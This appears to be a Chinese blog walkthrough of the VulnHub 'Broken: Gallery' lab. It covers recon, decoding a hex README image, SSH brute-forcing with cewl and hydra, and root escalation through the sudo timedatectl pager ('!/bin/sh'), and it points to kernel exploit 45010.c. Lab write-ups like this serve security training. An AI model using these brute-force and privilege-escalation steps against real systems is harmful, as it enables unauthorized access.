---
title: Broken-Gallery
author: Creexile
date: 2024-12-31 16:39:46
lastMod: 2024-12-31
summary: 'easyNo.2'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [爆破, 提权, 渗透]
---

# Broken: Gallery

---

easyNo.2

> 来源: [vulnhub靶场-Broken: Gallery](https://www.vulnhub.com/entry/broken-gallery,344/)
>
> 提示: Privilege escalation is another method of security through obscurity.
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.110.130
- target: 192.168.110.133

## 信息收集

nmap:

```
nmap -A 192.168.110.133

22/tcp    ssh
80/tcp    http
```

从http中找到一个README.md文件, 看着似乎是JPG头(JFIF), 于是我们写个py脚本将这个文件恢复回JPG:

```python
import re

def hex_to_bytes(hex_string):
    """
    将十六进制字符串转换为字节数据
    """
    return bytes.fromhex(hex_string)

def read_hex_data_from_file(file_path):
    """
    从文件中读取十六进制字节数据
    """
    with open(file_path, 'r') as file:
        data = file.read()
    # 提取所有的十六进制数值：例如 "0xFF, 0xD8" 提取为 "FF D8"
    hex_values = re.findall(r'0x([0-9A-Fa-f]{2})', data)
    hex_string = ' '.join(hex_values)
    return hex_to_bytes(hex_string)

def save_image_from_bytes(byte_data, output_file):
    """
    将字节数据保存为图片文件
    """
    with open(output_file, 'wb') as img_file:
        img_file.write(byte_data)
    print(f"图片已保存为 '{output_file}'")


hex_data = read_hex_data_from_file('readme.txt')
save_image_from_bytes(hex_data, 'output_image.jpg')
```

得到的图片内容如下:

```
Hello Bob,

The application is BROKEN ! the whole infrastructure is BROKEN !!!!

I am leaving for my summer vacation,I hope you get it fix soon...

Cheers.

avrahamcohen.ac@gmail.com
```

然后就没有内容了, 那就只能对22端口进行爆破了

先尝试将所有可能的内容都塞进用户名, 然后跑密码字典

```bash
cewl 192.168.110.133 -w user.txt
# 手动将图片内容的单词添加上去
hydra -L user.txt -P pass.txt ssh://192.168.110.133
# 或者你直接跑/usr/share/wordlists/rockyou.txt.gz(没试过)
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220174620.png)

## getshell

正常利用`broken : broken`登录

## 信息收集

```bash
# 系统信息 Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 4.4.0-21-generic
uname -r
# 查看环境
gcc -v
python -h
# 查看特权文件, 没啥东西
find / -perm -4000 2>/dev/null
# 自启动看看, 没东西
cat /etc/crontab
# 看看权限, 发现有sudo权限
sudo -l
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220175657.png)

## 提权

文件`/usr/bin/timedatectl`在拥有sudo权限可以用于提权(直接复制粘贴即可):

```bash
# 在/usr/bin文件夹下
sudo timedatectl list-timezones
!/bin/sh
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220180206.png)

> `list-timezones`是列出时区的子命令, 运行sudo timedatectl list-timezones会显示类似less/more查看的方式; 而键入感叹号`!`表示执行系统命令, 此时是root权限, 所以会返回一个root权限的shell

再来试试脚本: ubuntu 4.4.0-21-generic可以用45010.c

```bash
locate linux/local/45010.c
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241220181924.png)
